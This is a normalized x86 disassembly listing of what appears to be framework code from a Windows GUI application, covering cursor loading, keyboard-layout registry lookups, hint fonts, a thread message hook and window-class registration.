mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46ae1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418314
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418314
mov eax [ rw-data ]
call sub_46dba8
sub_46ae54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41860c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41860c
mov eax [ rw-data ]
call sub_46dba8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_455060
sub_46aebc
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46af74
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46af18
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026fc
mov ebx esi
test ebx ebx
jne r-xdata
sub_46af74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46af9c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46b147
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b14e
lea eax [ ebp - 0x260 ]
call sub_403f20
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f20
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41a7f0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408cec
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_458808
test al al
je r-xdata
xor eax eax
push ebp
push sub_46b103
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404190
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404190
sub_46b1b8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46da18
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d7cc
mov dl 0x1
mov eax [ rw-data ]
call sub_46d7cc
sub_46b224
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46b24c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46b224
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406b14
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406a94
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46b2dc
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46b421
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d7cc
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423bfc
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423bfc
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423ce0
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423bfc
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423bfc
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423bfc
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46d7cc
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_423a40
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_423a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b428
cmp [ rw-data ] 0x0
je r-xdata
sub_46b460
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_46b4c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46b5fc ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46b670
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46adc8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418470
mov dl [ ebp - 0x1 ]
call sub_46b4c0
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46adb4
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418314
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4184ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418470
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46b460
test al al
je r-xdata
inc esi
sub_46b7bc
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46adc8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46adb4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_46b814
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46b7bc
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46b88e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46b670
pop ecx
push ebp
mov al 0x2
call sub_46b670
pop ecx
push ebp
mov al 0x3
call sub_46b670
pop ecx
push ebp
mov al 0x4
call sub_46b670
pop ecx
push ebp
mov al 0x5
call sub_46b670
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_46b89c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b430
xor eax eax
push ebp
push sub_46b915
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46b438
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46b930
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f20
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f74
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46b988
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_46b9b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46ddd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46b9dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44ba04
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46de50
sub_46ba38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cef0
sub_46ba7c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46ba38
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46b9dc
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_46baf0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46bb4c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46bb7c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46bba4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46bb4c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46bb7c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46bb7c
sub_46bbe4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420754
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d2bc
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429eb8
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42a288
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46da54
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c62c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d4b4
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c654
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4086e0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404190
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46dc30
mov eax ebx
call sub_46e5f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46beec
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_46bdcd
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_46e604
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46d2bc
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46d4b4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46de50
xor edx edx
mov eax esi
call sub_46d7cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4207a0
push esi
push sub_46c320
mov eax esi
call sub_46d0a8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40578c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403190
mov eax [ esi + 0x90 ]
call sub_403190
mov eax [ esi + 0x98 ]
call sub_403190
test bl bl
jle r-xdata
call sub_42187c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_46beec
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46c08d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c094
lea eax [ ebp - 0x2c ]
call sub_403f20
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_46c46c
call sub_4217e4
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4043e0
mov edx eax
mov ecx 0x84ca0000
